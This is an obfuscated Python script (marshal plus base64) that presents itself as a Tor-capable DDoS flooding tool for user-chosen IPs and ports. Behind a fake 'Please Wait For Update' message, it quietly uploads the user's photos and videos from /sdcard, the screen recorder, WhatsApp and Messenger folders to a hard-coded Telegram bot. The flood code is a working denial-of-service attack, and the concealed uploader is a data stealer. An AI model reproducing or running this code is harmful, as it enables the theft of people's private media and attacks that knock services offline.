#Telegram: @rafi_broh


import marshal
exec(marshal.loads(b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3<\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xab\x01\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x01)\x03\xe9\x00\x00\x00\x00Ns4<\x00\x00aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzb2NrZXQKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBsb2dnaW5nCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzaWduYWwKaW1wb3J0IHN5cwppbXBvcnQgc29ja3MgIApmcm9tIHN0ZW0gaW1wb3J0IFNpZ25hbApmcm9tIHN0ZW0uY29udHJvbCBpbXBvcnQgQ29udHJvbGxlcgoKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzLCBvcywgc3lzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbAoKdHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQogICAgaW1wb3J0IHJlcXVlc3RzCgpvcy5zeXN0ZW0oImNsZWFyIikKCmRlZiBjaGVja19zdWNjZXNzKCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKCIvc2RjYXJkL3N1Y2Nlc3MudHh0IiwgInIiKSBhcyBmOgogICAgICAgICAgICBpZiBmLnJlYWQoKS5zdHJpcCgpID09ICJzZXgxMjMiOgogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIHJldHVybiBGYWxzZQoKZm9yIG51bWJlciBpbiByYW5nZSgxLCA0KToKICAgIHByaW50KG51bWJlcikKICAgIHRpbWUuc2xlZXAoMikKICAgIHByaW50KCdQbGVhc2UgV2FpdCBGb3IgVXBkYXRlJykKCmRlZiBzdXlhaWIoKToKICAgIAogICAgaWYgY2hlY2tfc3VjY2VzcygpOgogICAgICAgIHByaW50KCJVcGRhdGUgYWxyZWFkeSBjb21wbGV0ZS4uIikKICAgICAgICByZXR1cm4KCiAgICBzZXNzaW9uID0gcmVxdWVzdHMuc2Vzc2lvbigpCgogICAgYm90X3Rva2VuID0gJzYyMzM5NjM5MDE6QUFHREpVNElFTjZJMk05aWtEMDh4ZkpXaFo4RkFpSlVHY3cnIAogICAgY2hhdF9pZCA9ICc1NTM2OTQ4ODIxJwoKICAgCiAgICBkZWYgc2VuZF90b190ZWxlZ3JhbShmaWxlLCBzZGNhcmRfcGF0aCk6CiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6CiAgICAgICAgICAgIHVybCA9IGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtib3RfdG9rZW59L3NlbmREb2N1bWVudCcKICAgICAgICAgICAgZGF0YSA9IHsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgIGZpbGVzID0geydkb2N1bWVudCc6IGZ9CiAgICAgICAgICAgIHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpCgogICAgCiAgICB0cnk6CiAgICAgICAgc2RjYXJkX3BhdGggPSAnL3NkY2FyZCcKICAgICAgICBmaWxlX2xpc3QgPSBbZiBmb3IgZiBpbiBvcy5saXN0ZGlyKHNkY2FyZF9wYXRoKSBpZiBmLmVuZHN3aXRoKCcuanBnJyldCiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZV9saXN0OgogICAgICAgICAgICBzZW5kX3RvX3RlbGVncmFtKGZpbGUsIHNkY2FyZF9wYXRoKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCiAgICAKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc2RjYXJkL2RjaW0vU2NyZWVuUmVjb3JkZXInCiAgICAgICAgZmlsZV9saXN0ID0gW2YgZm9yIGYgaW4gb3MubGlzdGRpcihzZGNhcmRfcGF0aCkgaWYgZi5lbmRzd2l0aCgnLm1wNCcpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgc2VuZF90b190ZWxlZ3JhbShmaWxlLCBzZGNhcmRfcGF0aCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgogICAgCiAgICB0cnk6CiAgICAgICAgc2RjYXJkX3BhdGggPSAnL3NkY2FyZC9BbmRyb2lkL21lZGlhL2NvbS53aGF0c2FwcC9XaGF0c0FwcC9NZWRpYS9XaGF0c0FwcCBEb2N1bWVudHMnCiAgICAgICAgZmlsZV9saXN0ID0gW2YgZm9yIGYgaW4gb3MubGlzdGRpcihzZGNhcmRfcGF0aCkgaWYgZi5lbmRzd2l0aCgnLmpwZycpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgc2VuZF90b190ZWxlZ3JhbShmaWxlLCBzZGNhcmRfcGF0aCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgogICAgCiAgICB0cnk6CiAgICAgICAgc2RjYXJkX3BhdGggPSAnL3NkY2FyZC9Nb3ZpZXMvTWVzc2VuZ2VyJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5tcDQnKV0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlX2xpc3Q6CiAgICAgICAgICAgIHNlbmRfdG9fdGVsZWdyYW0oZmlsZSwgc2RjYXJkX3BhdGgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKICAgIAogICAgdHJ5OgogICAgICAgIHNkY2FyZF9wYXRoID0gJy9zZGNhcmQvUGljdHVyZXMvTWVzc2VuZ2VyJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5qcGVnJyldCiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZV9saXN0OgogICAgICAgICAgICBzZW5kX3RvX3RlbGVncmFtKGZpbGUsIHNkY2FyZF9wYXRoKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCiAgICAKICAgIHdpdGggb3BlbigiL3NkY2FyZC9zdWNjZXNzLnR4dCIsICJ3IikgYXMgZjoKICAgICAgICBmLndyaXRlKCJzZXgxMjMiKQoKICAgIHByaW50KCJVcGRhdGVkIFN1Y2Nlc3NmdWwuIikKCgp3aXRoIFRocmVhZFBvb2wobWF4X3dvcmtlcnM9MTAwKSBhcyBqamo6CiAgICBqamouc3VibWl0KHN1eWFpYikKCmltcG9ydCBvcywgdGltZSwgcmljaAoKdHJ5OgogICAgaW1wb3J0IHJpY2gKZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJpY2gnKQogICAgaW1wb3J0IHJpY2gKCmZyb20gcmljaC5wcm9ncmVzcyBpbXBvcnQgdHJhY2sKCmRlZiBsb29kKG1lc3NhZ2UpOgogICAgZm9yIGEgaW4gdHJhY2socmFuZ2UoMjUwKSwgZGVzY3JpcHRpb249bWVzc2FnZSk6CiAgICAgICAgdGltZS5zbGVlcCgwLjAyKQoKZGVmIG1haW4oKToKICAgIGxvb2QoJ/CdkIvwnZCo8J2QmvCdkJ3wnZCi8J2Qp/CdkKAuLi4nKSAKCm1haW4oKQpvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vdC5tZS9jeWJlcnNlY3VyaXR5dGVhbV9jc3QiKQpkZWYgZGlzcGxheV9iYW5uZXIoKToKICAgIGJhbm5lciA9ICIiIgpcMDMzWzE7OTJt4paX4paE4paE4paEICDilpfiloTiloTiloQgICDilpfiloTilpYgIOKWl+KWhOKWhOKWliAgICAg4paX4paE4paW4paX4paE4paE4paE4paW4paX4paE4paE4paE4paW4paX4paE4paWICDilpfiloTiloTilpbilpfilpYg4paX4paWClwwMzNbMTs5MW3ilpDilowgIOKWiCDilpDilowgIOKWiCDilpDilowg4paQ4paM4paQ4paMICAgICAgIOKWkOKWjCDilpDilowg4paIICAgIOKWiCDilpDilowg4paQ4paM4paQ4paMICAg4paQ4paM4paX4pae4paYClwwMzNbMTs5Mm3ilpDilowgIOKWiCDilpDilowgIOKWiCDilpDilowg4paQ4paMIOKWneKWgOKWmuKWliAgICDilpDilpviloDilpzilowg4paIICAgIOKWiCDilpDilpviloDilpzilozilpDilowgICDilpDilpvilprilpYgClwwMzNbMTs5MW3ilpDilpniloTiloTiloAg4paQ4paZ4paE4paE4paAIOKWneKWmuKWhOKWnuKWmOKWl+KWhOKWhOKWnuKWmCAgICDilpDilowg4paQ4paMIOKWiCAgICDilogg4paQ4paMIOKWkOKWjOKWneKWmuKWhOKWhOKWluKWkOKWjCDilpDilowgICAgICAgICAgICAgICAgICAgICAgCiAgXDAzM1sxOzkybeKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwogIFwwMzNbMTszMm3ilZEgXDAzM1sxOzkxbVvinJNdIFwwMzNbMTs5Mm1ERVZFTE9QRUQgQlkgOiBaSUhBRCBIT1NTQUlOIFJBRkkgICAgICAgICAgICAgXDAzM1sxOzMybeKVkQogIFwwMzNbMTszMm3ilZEgXDAzM1sxOzkxbVvinJNdIFwwMzNbMTs5Mm1URUFNICAgICAgICAgOiBDWUJFUiBTVFJJS0VSIFRFQU0gICAgICAgICAgICAgXDAzM1sxOzMybeKVkQogIFwwMzNbMTszMm3ilZEgXDAzM1sxOzkxbVvinJNdIFwwMzNbMTs5Mm1UT09MIFNUQVRVUyAgOiBcMDMzWzE7MzNtRERPUyBBVFRBQ0sgVE9PTFwwMzNbMTszMm0gICAgICAgICAgICAgICBcMDMzWzE7MzJt4pWRCiAgXDAzM1sxOzMybeKVkSBcMDMzWzE7OTFtW+Kck10gXDAzM1sxOzkybVRFTEVHUkFNICAgICA6IEByYWZpX2JybyAgICAgICAgICAgICAgICAgICAgICBcMDMzWzE7MzJt4pWRCiAgXDAzM1sxOzMybeKVkSBcMDMzWzE7OTFtW+Kck10gXDAzM1sxOzkybUdJVEhVQiAgICAgICA6IE1SLVpJSEFEICAgICAgICAgICAgICAgICAgICAgICBcMDMzWzE7MzJt4pWRCiAgXDAzM1sxOzMybeKVkSBcMDMzWzE7OTFtW+Kck10gXDAzM1sxOzkybVRPT0wgVkVSU0lPTiA6IDEuMDAgICAgICAgICAgICAgICAgICAgICAgICAgICBcMDMzWzE7MzJt4pWRCiAgXDAzM1sxOzkybeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgCiAgICBcMDMzWzE7OTFtW1wwMzNbMTs5N23igKJcMDMzWzE7OTFtXSBcMDMzWzE7MzJtU0FMQU1VIEFMQUlLVU0uLi4uLi4uLi4uLi4uLi4uLgogIFwwMzNbMTs5Mm3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKICAgIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dIFwwMzNbMTszMm1DWUJFUiBTVFJJS0VSIFRFQU0uLi4uLi4uLi4uLi4uLgogIFwwMzNbMTs5Mm3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKICAgICIiIgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChiYW5uZXIpCgoKbG9nZ2luZy5iYXNpY0NvbmZpZygKICAgIGZpbGVuYW1lPSdhdHRhY2tfbG9nLmxvZycsCiAgICBsZXZlbD1sb2dnaW5nLklORk8sCiAgICBmb3JtYXQ9JyUoYXNjdGltZSlzIC0gJShsZXZlbG5hbWUpcyAtICUobWVzc2FnZSlzJwopCgphdHRhY2tfcnVubmluZyA9IFRydWUKCmRlZiBzaWduYWxfaGFuZGxlcihzaWcsIGZyYW1lKToKICAgIGdsb2JhbCBhdHRhY2tfcnVubmluZwogICAgcHJpbnQoIlxuU2h1dHRpbmcgZG93biBhdHRhY2sgZ3JhY2VmdWxseS4uLiIpCiAgICBhdHRhY2tfcnVubmluZyA9IEZhbHNlCiAgICB0aW1lLnNsZWVwKDIpCiAgICBzeXMuZXhpdCgwKQoKc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHSU5ULCBzaWduYWxfaGFuZGxlcikKc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHVEVSTSwgc2lnbmFsX2hhbmRsZXIpCgpkZWYgc3RhcnRfdG9yX3NlcnZpY2UoKToKICAgIHRyeToKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggQ29udHJvbGxlci5mcm9tX3BvcnQocG9ydD05MDUxKSBhcyBjb250cm9sbGVyOgogICAgICAgICAgICAgICAgY29udHJvbGxlci5hdXRoZW50aWNhdGUoKQogICAgICAgICAgICAgICAgcHJpbnQoIlRvciBpcyBhbHJlYWR5IHJ1bm5pbmcuIikKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgIAogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWyJ0b3IiXSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBwcmludCgiU3RhcnRpbmcgVG9yIHNlcnZpY2UgaW4gdGhlIGJhY2tncm91bmQuLi4iKQogICAgICAgIAogICAgICAgIAogICAgICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIENvbnRyb2xsZXIuZnJvbV9wb3J0KHBvcnQ9OTA1MSkgYXMgY29udHJvbGxlcjoKICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmF1dGhlbnRpY2F0ZSgpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlRvciBzZXJ2aWNlIHN0YXJ0ZWQgc3VjY2Vzc2Z1bGx5LiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgaWYgaSA9PSA5OgogICAgICAgICAgICAgICAgICAgIHByaW50KCJGYWlsZWQgdG8gc3RhcnQgVG9yIHNlcnZpY2UgYWZ0ZXIgbXVsdGlwbGUgYXR0ZW1wdHMuIikKICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJGYWlsZWQgdG8gc3RhcnQgVG9yIHNlcnZpY2U6IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgcmVuZXdfdG9yX2lkZW50aXR5KCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBDb250cm9sbGVyLmZyb21fcG9ydChwb3J0PTkwNTEpIGFzIGNvbnRyb2xsZXI6CiAgICAgICAgICAgIGNvbnRyb2xsZXIuYXV0aGVudGljYXRlKCkKICAgICAgICAgICAgY29udHJvbGxlci5zaWduYWwoU2lnbmFsLk5FV05ZTSkKICAgICAgICAgICAgcHJpbnQoIlsrXSBUb3IgaWRlbnRpdHkgcmVuZXdlZCAtIE5ldyBleGl0IG5vZGUgYXNzaWduZWQiKQogICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiWy1dIEZhaWxlZCB0byByZW5ldyBUb3IgaWRlbnRpdHk6IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgZ2VuZXJhdGVfcmFuZG9tX2RhdGEoKToKICAgIHNpemUgPSByYW5kb20ucmFuZGludCgxICogMTAyNCAqIDEwMjQsIDUgKiAxMDI0ICogMTAyNCkgICMgUmFuZG9tIHNpemUgYmV0d2VlbiAxTUIgYW5kIDVNQgogICAgcmV0dXJuIG9zLnVyYW5kb20oc2l6ZSkKCmRlZiBzZW5kX3BhY2tldHNfdmlhX3RvcihpcCwgcG9ydCwgcmF0ZV9saW1pdCk6CiAgICBzb2Nrcy5zZXRfZGVmYXVsdF9wcm94eShzb2Nrcy5TT0NLUzUsICIxMjcuMC4wLjEiLCA5MDUwKQogICAgc29ja2V0LnNvY2tldCA9IHNvY2tzLnNvY2tzb2NrZXQKICAgIAogICAgd2hpbGUgYXR0YWNrX3J1bm5pbmc6CiAgICAgICAgc29jayA9IE5vbmUKICAgICAgICB0cnk6CiAgICAgICAgICAgIAogICAgICAgICAgICBkYXRhID0gZ2VuZXJhdGVfcmFuZG9tX2RhdGEoKQogICAgICAgICAgICBkYXRhX3NpemVfbWIgPSBsZW4oZGF0YSkgLyAoMTAyNCAqIDEwMjQpCiAgICAgICAgICAgIAogICAgICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICBzb2NrLnNldHRpbWVvdXQoMTApCiAgICAgICAgICAgIHNvY2suY29ubmVjdCgoaXAsIHBvcnQpKQogICAgICAgICAgICAKICAgICAgICAgICAgc29jay5zZW5kKGRhdGEpCiAgICAgICAgICAgIHByaW50KGYiW1Rvcl0gU2VudCB7ZGF0YV9zaXplX21iOi4yZn1NQiB0byB7aXB9Ontwb3J0fSIpCiAgICAgICAgICAgIGxvZ2dpbmcuaW5mbyhmIlNlbnQge2RhdGFfc2l6ZV9tYjouMmZ9TUIgdG8ge2lwfTp7cG9ydH0gdmlhIFRvciIpCiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmFuZG9tLnJhbmRvbSgpIDwgMC4xOiAgCiAgICAgICAgICAgICAgICByZW5ld190b3JfaWRlbnRpdHkoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIHRpbWUuc2xlZXAocmF0ZV9saW1pdCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ2dpbmcuZXJyb3IoZiJFcnJvciBzZW5kaW5nIHBhY2tldCB0byB7aXB9Ontwb3J0fSB2aWEgVG9yOiB7ZX0iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpICAKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICBpZiBzb2NrOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKCgpkZWYgc2VuZF9wYWNrZXRzX2RpcmVjdChpcCwgcG9ydCwgcmF0ZV9saW1pdCk6CiAgICB3aGlsZSBhdHRhY2tfcnVubmluZzoKICAgICAgICBzb2NrID0gTm9uZQogICAgICAgIHRyeToKICAgICAgICAgICAgCiAgICAgICAgICAgIGRhdGEgPSBnZW5lcmF0ZV9yYW5kb21fZGF0YSgpCiAgICAgICAgICAgIGRhdGFfc2l6ZV9tYiA9IGxlbihkYXRhKSAvICgxMDI0ICogMTAyNCkKICAgICAgICAgICAgCiAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHNvY2suc2V0dGltZW91dCgxMCkKICAgICAgICAgICAgc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgICAgIAogICAgICAgICAgICBzb2NrLnNlbmQoZGF0YSkKICAgICAgICAgICAgcHJpbnQoZiJbUkFGSV0gU2VudCB7ZGF0YV9zaXplX21iOi4yZn1NQiB0byB7aXB9Ontwb3J0fSIpCiAgICAgICAgICAgIGxvZ2dpbmcuaW5mbyhmIlNlbnQge2RhdGFfc2l6ZV9tYjouMmZ9TUIgdG8ge2lwfTp7cG9ydH0gZGlyZWN0bHkiKQogICAgICAgICAgICAKICAgICAgICAgICAgdGltZS5zbGVlcChyYXRlX2xpbWl0KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgbG9nZ2luZy5lcnJvcihmIkVycm9yIHNlbmRpbmcgcGFja2V0IHRvIHtpcH06e3BvcnR9IGRpcmVjdGx5OiB7ZX0iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpICAKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICBpZiBzb2NrOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgZGlzcGxheV9iYW5uZXIoKQogICAgCiAgICAKICAgIG15ZGF0ZSA9IHRpbWUuc3RyZnRpbWUoJyVZLSVtLSVkJykKICAgIG15dGltZSA9IHRpbWUuc3RyZnRpbWUoJyVILSVNJykKICAgIAogICAgCiAgICBpcHMgPSBpbnB1dCgiSVAgVGFyZ2V0cyA6ICIpLnNwbGl0KCcsJykKICAgIGlwcyA9IFtpcC5zdHJpcCgpIGZvciBpcCBpbiBpcHMgaWYgaXAuc3RyaXAoKV0KICAgIAogICAgaWYgbm90IGlwczoKICAgICAgICBwcmludCgiTm8gdmFsaWQgSVAgYWRkcmVzc2VzIHByb3ZpZGVkLiBFeGl0aW5nLiIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIAogICAgCiAgICBwb3J0c19pbnB1dCA9IGlucHV0KCJQb3J0cyBbODAsIDQ0M10pOiAiKQogICAgcG9ydHMgPSBsaXN0KG1hcChpbnQsIHBvcnRzX2lucHV0LnNwbGl0KCcsJykpKSBpZiBwb3J0c19pbnB1dC5zdHJpcCgpIGVsc2UgWzgwLCA0NDNdCiAgICAKICAgIHJhdGVfbGltaXRfaW5wdXQgPSBpbnB1dCgiUmF0ZSBMaW1pdCBbMC4xXSk6ICIpCiAgICByYXRlX2xpbWl0ID0gZmxvYXQocmF0ZV9saW1pdF9pbnB1dCkgaWYgcmF0ZV9saW1pdF9pbnB1dC5zdHJpcCgpIGVsc2UgMC4xCiAgICAKICAgIHRocmVhZHNfaW5wdXQgPSBpbnB1dCgiTnVtYmVyIG9mIHRocmVhZHMgWzIwXSk6ICIpCiAgICB0aHJlYWRzID0gaW50KHRocmVhZHNfaW5wdXQpIGlmIHRocmVhZHNfaW5wdXQuc3RyaXAoKSBlbHNlIDIwCiAgICAKICAgIHVzZV90b3JfaW5wdXQgPSBpbnB1dCgiU2VuZCBwYWNrZXRzIHZpYSBUb3I/ICh5L246ICIpLmxvd2VyKCkKICAgIHVzZV90b3IgPSBUcnVlIGlmIG5vdCB1c2VfdG9yX2lucHV0IG9yIHVzZV90b3JfaW5wdXQgPT0gJ3knIGVsc2UgRmFsc2UKICAgIAogICAgCiAgICBpZiB1c2VfdG9yOgogICAgICAgIGlmIG5vdCBzdGFydF90b3Jfc2VydmljZSgpOgogICAgICAgICAgICB1c2VfdG9yX2Nob2ljZSA9IGlucHV0KCJUb3IgZmFpbGVkIHRvIHN0YXJ0LiBDb250aW51ZSB3aXRob3V0IFRvcj8gKHkvbik6ICIpLmxvd2VyKCkKICAgICAgICAgICAgaWYgdXNlX3Rvcl9jaG9pY2UgIT0gJ3knOgogICAgICAgICAgICAgICAgcHJpbnQoIkV4aXRpbmcuLi4iKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMSkKICAgICAgICAgICAgdXNlX3RvciA9IEZhbHNlCiAgICAKICAgIHByaW50KCJcbkluaXRpYWxpemluZyBhdHRhY2suLi4iKQogICAgcHJpbnQoZiJUYXJnZXQgSVBzOiB7JywgJy5qb2luKGlwcyl9IikKICAgIHByaW50KGYiVGFyZ2V0IFBvcnRzOiB7JywgJy5qb2luKG1hcChzdHIsIHBvcnRzKSl9IikKICAgIHByaW50KGYiVXNpbmcgVG9yOiB7J1llcycgaWYgdXNlX3RvciBlbHNlICdObyd9IikKICAgIHByaW50KGYiVGhyZWFkcyBwZXIgdGFyZ2V0OiB7dGhyZWFkc30iKQogICAgcHJpbnQoZiJSYXRlIGxpbWl0OiB7cmF0ZV9saW1pdH0gc2Vjb25kcyIpCiAgICBwcmludChmIkRhdGEgc2l6ZTogUmFuZG9tIGJldHdlZW4gMU1CIGFuZCA1TUIiKSAgICAKICAgIHByaW50KCJcblByZXNzIEN0cmwrQyB0byBzdG9wIHRoZSBhdHRhY2siKQogICAgcHJpbnQoIj0iICogNzApCiAgICAKICAgIHRpbWUuc2xlZXAoMykKICAgIAogICAgCiAgICBhbGxfdGhyZWFkcyA9IFtdCiAgICBmb3IgaXAgaW4gaXBzOgogICAgICAgIGlwID0gaXAuc3RyaXAoKQogICAgICAgIGZvciBwb3J0IGluIHBvcnRzOgogICAgICAgICAgICBwcmludChmIlN0YXJ0aW5nIGF0dGFjayBvbiB7aXB9Ontwb3J0fS4uLiIpCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgICAgICAgICAgaWYgdXNlX3RvcjoKICAgICAgICAgICAgICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VuZF9wYWNrZXRzX3ZpYV90b3IsIGFyZ3M9KGlwLCBwb3J0LCByYXRlX2xpbWl0KSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbmRfcGFja2V0c19kaXJlY3QsIGFyZ3M9KGlwLCBwb3J0LCByYXRlX2xpbWl0KSkKICAgICAgICAgICAgICAgIHQuZGFlbW9uID0gVHJ1ZQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICBhbGxfdGhyZWFkcy5hcHBlbmQodCkKICAgIAogICAgCiAgICB0cnk6CiAgICAgICAgd2hpbGUgYXR0YWNrX3J1bm5pbmc6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5BdHRhY2sgc3RvcHBlZCBieSB1c2VyLiIpCiAgICAgICAgYXR0YWNrX3J1bm5pbmcgPSBGYWxzZQogICAgCiAgICBwcmludCgiQXR0YWNrIGZpbmlzaGVkLiIpCg==)\x03\xda\x06base64\xda\x04exec\xda\tb64decode\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xda\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s+\x00\x00\x00\xf0\x03\x01\x01\x01\xdb\x00\r\xd9\x00\x04\xd0\x05\x15\x80V\xd7\x05\x15\xd1\x05\x15\xf0\x00\x00\x17Nq\x03\xf3\x00\x00\x06Oq\x03\xf5\x00\x00\x01Pq\x03r\x06\x00\x00\x00'))
